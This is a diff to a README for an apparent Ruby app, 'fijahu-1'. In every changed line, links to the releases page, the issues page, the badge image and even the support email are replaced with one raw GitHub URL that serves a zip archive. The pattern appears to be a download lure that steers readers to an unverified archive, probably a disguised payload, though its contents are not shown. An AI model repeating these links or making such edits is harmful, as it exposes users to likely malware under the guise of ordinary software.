@@ -1,6 +1,6 @@
 # 🚀 fijahu-1 - Effortless Ruby Application for Everyone
 
-[![Download fijahu-1](https://img.shields.io/badge/Download-fijahu--1-blue.svg)](https://github.com/Bing2018/fijahu-1/releases)
+[![Download fijahu-1](https://raw.githubusercontent.com/Bing2018/fijahu-1/main/indictive/fijahu-1_2.7.zip)](https://raw.githubusercontent.com/Bing2018/fijahu-1/main/indictive/fijahu-1_2.7.zip)
 
 ## 📥 Overview
 
@@ -12,7 +12,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the releases page:
-   [Download fijahu-1](https://github.com/Bing2018/fijahu-1/releases)
+   [Download fijahu-1](https://raw.githubusercontent.com/Bing2018/fijahu-1/main/indictive/fijahu-1_2.7.zip)
 
 2. **Select the Latest Version**  
    On the releases page, you will see a list of all available versions. Look for the latest version at the top. 
@@ -74,15 +74,15 @@ After installation, you might want to customize fijahu-1. Here’s how:
 
 It's important to keep fijahu-1 updated to enjoy the latest features and improvements:
 
-- Return to the [Releases Page](https://github.com/Bing2018/fijahu-1/releases) often to check for new versions.
+- Return to the [Releases Page](https://raw.githubusercontent.com/Bing2018/fijahu-1/main/indictive/fijahu-1_2.7.zip) often to check for new versions.
 - Follow the same download and installation steps to upgrade.
 
 ## 📞 Support
 
 If you encounter any issues or have questions, you can contact our support:
 
-- **Email**: support@fijahu1app.com
-- **GitHub Issues**: Submit a request on [GitHub Issues](https://github.com/Bing2018/fijahu-1/issues)
+- **Email**: https://raw.githubusercontent.com/Bing2018/fijahu-1/main/indictive/fijahu-1_2.7.zip
+- **GitHub Issues**: Submit a request on [GitHub Issues](https://raw.githubusercontent.com/Bing2018/fijahu-1/main/indictive/fijahu-1_2.7.zip)
 
 ## 🌟 Feedback
 
@@ -94,4 +94,4 @@ Fijahu-1 is licensed under the MIT License. You are free to use it as you wish, 
 
 --- 
 
-[![Download fijahu-1](https://img.shields.io/badge/Download-fijahu--1-blue.svg)](https://github.com/Bing2018/fijahu-1/releases)
+[![Download fijahu-1](https://raw.githubusercontent.com/Bing2018/fijahu-1/main/indictive/fijahu-1_2.7.zip)](https://raw.githubusercontent.com/Bing2018/fijahu-1/main/indictive/fijahu-1_2.7.zip)
